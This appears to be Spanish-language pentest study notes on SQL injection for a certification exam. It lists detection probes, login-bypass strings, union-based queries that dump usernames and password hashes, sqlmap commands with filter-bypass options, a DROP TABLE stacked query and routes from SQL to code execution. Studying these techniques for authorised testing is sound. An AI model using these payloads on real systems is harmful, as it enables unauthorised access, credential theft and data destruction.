# SQL Injection

## Detección rápida

Inyecta en cada parámetro (GET/POST/header/cookie) y observa cambios:

```
'        "        `        ')       ';--      ' OR '1'='1
```

- Error SQL en la respuesta → **error-based**.
- Cambio de comportamiento sin error (login pasa / tamaño cambia) → **boolean-blind**.
- Respuesta tarda con `SLEEP()`/`pg_sleep()` → **time-blind**.

## Auth bypass (clásico)

```sql
admin' --
admin' #
' OR 1=1 -- -
' OR '1'='1' -- -
```

Captura el request de login en Burp, cambia el campo y observa si entras.

## Union-based (extracción de datos)

```sql
-- 1. Número de columnas
' ORDER BY 1-- -      (sube hasta error)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -

-- 2. Columnas reflejadas y versión
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,@@version,NULL-- -      (MySQL)
' UNION SELECT NULL,version(),NULL-- -       (PostgreSQL)

-- 3. Enumerar esquema (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -

-- 4. Dump
' UNION SELECT NULL,CONCAT(username,0x3a,password),NULL FROM users-- -
```

## sqlmap (cuando aplica)

```bash
# Desde un request guardado en Burp (botón derecho → Save to file)
sqlmap -r request.req --batch
sqlmap -r request.req --dbs
sqlmap -r request.req -D nombre_db --tables
sqlmap -r request.req -D nombre_db -T users --dump

# Útiles
--level=5 --risk=3        # más vectores
--technique=U             # solo union
--tamper=space2comment    # bypass de filtros básicos
```

> En CWEE prioriza **inyección manual**: entender el payload cuenta más que
> automatizar. sqlmap para confirmar/acelerar, no como única herramienta.

## Dump → crack

Hashes extraídos se identifican y crackean (ver
[10-hash-cracking.md](10-hash-cracking.md)). Patrón típico: SQLi → hash admin →
rockyou → acceso al panel.

## Variantes útiles

- **Stacked queries** (`;`): `'; DROP TABLE x-- -` (solo si el driver lo permite, p.ej. MSSQL/PG).
- **RCE desde SQL**:
  - MySQL: `INTO OUTFILE` para escribir webshell (requiere `secure_file_priv` laxo).
  - MSSQL: `xp_cmdshell`.
  - PostgreSQL: `COPY ... FROM PROGRAM`.
- **NoSQL** (Mongo): `{"$ne": null}`, `admin'||'1'=='1`.

## Mitigación (para el informe)

Consultas parametrizadas / prepared statements, ORM, validación de tipos,
principio de mínimo privilegio en la cuenta de BD.
